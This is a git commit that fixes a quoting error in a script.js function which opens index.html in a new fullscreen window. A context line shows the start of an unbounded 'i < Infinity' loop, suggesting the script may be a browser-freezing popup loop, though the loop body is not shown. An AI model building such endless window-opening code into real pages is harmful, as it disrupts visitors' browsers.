590ec0434cc4f3701aade8a08511fab540a48a97
kwin487 <82954361+kwin487@users.noreply.github.com>
2022-09-16 11:35:10 -0500

    Update script.js

--- script.js
+++ script.js
@@ -1,6 +1,6 @@
 function NewTab() {
             window.open(
-            "index.html", "_blank","width=100%,height=100%","fullscreen=1);
+            "index.html", "_blank","width=100%,height=100%","fullscreen=1");
         }
 
 for (var i = 0; i < Infinity; i++) {
